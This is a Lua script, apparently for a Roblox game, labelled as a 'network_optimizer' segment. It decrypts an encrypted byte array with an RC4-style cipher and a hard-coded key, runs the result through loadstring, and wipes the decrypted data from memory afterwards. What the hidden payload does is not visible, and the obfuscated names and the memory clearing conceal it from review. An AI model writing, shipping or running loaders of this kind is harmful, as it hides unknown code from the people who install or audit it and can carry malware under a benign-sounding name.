-- Protected Segment (network_optimizer)
local NgVCPZPN = 172
local MhjHqdyZ = {
{169,14,129,213,5,190,76,178,241,109,219,248,202,191,124,130,173,193,190,122,134,213,53,46,108,6,212,27,110,255,53,188,222,6,57,83,218,129,12,224,39,41,12,10,15,37,106,182,69,117,102,13,114,191,33,129,173,217,117,238},{250,6,77,178,22,95,3,125,36,157,78,183,192,138,147,147,6,69,246,221,131,192,104,123,54,236,243,175,86,63,144,186,229,124,63,240,229,115,14,62,236,182,22,26,218,96,30,13,31,76,63,32,125,137,172,97,156,140,39,132},{126,87,18,107,125,135,128,50,222,111,208,111,222,142,199,112,3,165,159,226,161,151,112,179,153,145,34,179,215}
}
local mrvzPheb = "PtldcScYTRUuIjcd"

local function Kfkzbpsb(xITiwQCE_data, xITiwQCE_key)
    if type(xITiwQCE_key) ~= "string" or #xITiwQCE_key == 0 then return "" end
    local xITiwQCE = {}
    for IGREpLDn = 0, 255 do xITiwQCE[IGREpLDn] = IGREpLDn end
    local HfVeQpuT = 0
    for IGREpLDn = 0, 255 do
        local MCzmleKS = xITiwQCE_key:byte((IGREpLDn % #xITiwQCE_key) + 1)
        HfVeQpuT = (HfVeQpuT + xITiwQCE[IGREpLDn] + MCzmleKS) % 256
        xITiwQCE[IGREpLDn], xITiwQCE[HfVeQpuT] = xITiwQCE[HfVeQpuT], xITiwQCE[IGREpLDn]
    end
    local IGREpLDn = 0
    local HfVeQpuT = 0
    local dVxCioTd = {}
    for _, NRLcfufS in ipairs(xITiwQCE_data) do
        IGREpLDn = (IGREpLDn + 1) % 256
        HfVeQpuT = (HfVeQpuT + xITiwQCE[IGREpLDn]) % 256
        xITiwQCE[IGREpLDn], xITiwQCE[HfVeQpuT] = xITiwQCE[HfVeQpuT], xITiwQCE[IGREpLDn]
        local MCzmleKS = xITiwQCE[(xITiwQCE[IGREpLDn] + xITiwQCE[HfVeQpuT]) % 256]
        local unmasked = bit32.bxor(NRLcfufS, NgVCPZPN)
        table.insert(dVxCioTd, string.char(bit32.bxor(unmasked, MCzmleKS)))
    end
    return table.concat(dVxCioTd)
end

local xITiwQCE_flat = {}
for _, chunk in ipairs(MhjHqdyZ) do
    for _, byte in ipairs(chunk) do
        table.insert(xITiwQCE_flat, byte)
    end
end

local decrypted = Kfkzbpsb(xITiwQCE_flat, mrvzPheb)
local qmAxKbEo, SpWnJcGf = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(xITiwQCE_flat)
xITiwQCE_flat = nil

if qmAxKbEo then 
    local result = qmAxKbEo() 
    decrypted = nil
    qmAxKbEo = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "network_optimizer" .. "): " .. tostring(SpWnJcGf)) 
end
